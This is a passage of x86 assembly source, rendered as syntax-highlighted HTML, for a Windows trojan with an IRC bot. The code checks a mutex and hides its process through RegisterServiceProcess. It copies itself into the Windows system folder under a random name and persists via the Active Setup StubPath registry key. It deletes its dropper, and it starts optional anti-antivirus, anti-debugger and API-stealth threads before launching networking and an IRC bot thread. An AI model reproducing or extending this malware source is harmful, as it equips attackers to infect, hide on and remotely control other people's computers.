            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__dll</span><span class="sc0">                   </span><span class="sc1">; and loop for that dll</span><span class="sc0">

            </span><span class="sc5">PATCH_API</span><span class="sc0">   </span><span class="sc5">ExitThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsprintfA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapFree</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_OpenMutexA</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KewlMutex</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SYNCHRONIZE</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; OpenMutexA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc1">;jecxz  __new                   ; is it already installed?</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__new</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; CloseHandle</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">troj_exit</span><span class="sc0">

</span><span class="sc5">__new</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">PeekMessageA</span><span class="sc0">                </span><span class="sc1">; remove the hour-glass cursor</span><span class="sc0">

            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; disable error messages</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; SetErrorMode</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; HeapCreate</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">troj_exit</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_dd_heap_handle</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_dd_heap_handle_1</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">heap_handle</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">TEB_PEB</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; take ptr to PEB</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; is it above 80000000h?</span><span class="sc0">
            </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">NT_startup</span><span class="sc0">              </span><span class="sc1">; if so, we r on NT</span><span class="sc0">
            
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__skip</span><span class="sc0">                  </span><span class="sc1">; is RegisterServiceProcess present?</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; is so, stealth ourselvez</span><span class="sc0">
            
</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_get_r0_mark</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_which_gen</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__first_gen</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__loaded_in_windir</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ex</span><span class="sc0">
                                    
</span><span class="sc5">__first_gen</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_which_gen</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_store_r0_mark</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__do_file_copy</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">STARTF_USESHOWWINDOW</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">68</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            
            
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_NEW_CONSOLE</span><span class="sc0">          </span><span class="sc1">; !!</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">CreateProcessA</span><span class="sc0">              </span><span class="sc1">; Y DA FUCK IT INHERITS DOS WINDOW??</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0">
            
</span><span class="sc5">__ex</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">FreeLibrary</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">DeleteFileA</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">; ExitThread surprisingly causes gpf, but only when trw200 is on!</span><span class="sc0">
            
</span><span class="sc5">__loaded_in_windir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_which_gen</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_store_r0_mark</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_in_ring0</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__continue</span><span class="sc0">
                        
</span><span class="sc5">__do_file_copy</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> !</span><span class="sc5">%windir</span><span class="sc0">!</span><span class="sc5">%</span><span class="sc0">\</span><span class="sc5">system</span><span class="sc0">\</span><span class="sc5">system32.exe</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandString</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">.exe</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">_xsize</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">_xsize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">_xsize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">200</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; ExpandEnvironmentStringsA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
    
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">300</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; GetModuleFileNameA</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; CopyFileA</span><span class="sc0">

            </span><span class="sc6">retn</span><span class="sc0">
            
</span><span class="sc5">__continue</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">200</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Software</span><span class="sc0">\</span><span class="sc5">Microsoft</span><span class="sc0">\</span><span class="sc5">Active</span><span class="sc0"> </span><span class="sc5">Setup</span><span class="sc0">\</span><span class="sc5">Installed</span><span class="sc0"> </span><span class="sc5">Components</span><span class="sc0">\</span><span class="sc5">EvionInstall</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">StubPath</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_xsize</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_SZ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">SHSetValueA</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; adjust stack frame</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Software</span><span class="sc0">\</span><span class="sc5">Microsoft</span><span class="sc0">\</span><span class="sc5">Active</span><span class="sc0"> </span><span class="sc5">Setup</span><span class="sc0">\</span><span class="sc5">Installed</span><span class="sc0"> </span><span class="sc5">Components</span><span class="sc0">\</span><span class="sc5">EvionInstall</span><span class="sc4">~&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">SHDeleteKeyA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">

            </span><span class="sc5">x_push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KewlMutex</span><span class="sc4">~</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">CreateMutexA</span><span class="sc0">
            </span><span class="sc5">x_pop</span><span class="sc0">
    
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">troj_exit</span><span class="sc0">

            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">GetLastError</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_ALREADY_EXISTS</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">troj_exit</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">ANTI_AV</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">anti_av_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_av_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; ANTI_AV</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">STEALTH_API</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealth_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_stealth_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; STEALTH_API</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">STEALTH_API2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stealth_thread2</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_stealth_thread2</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; STEALTH_API2</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">ANTI_DEBUG</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">killer_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_killer_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; ANTI_DEBUG</span><span class="sc0">

</span><span class="sc5">__main_thread_wait</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc5">__main_thread</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">onlyne</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__main_thread_wait</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_onlyne_flag</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc5">callg</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">troj_exit</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_BOT</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ircbot_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">inet_threadz</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_BOT</span><span class="sc0">

</span><span class="sc5">__onlyne_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
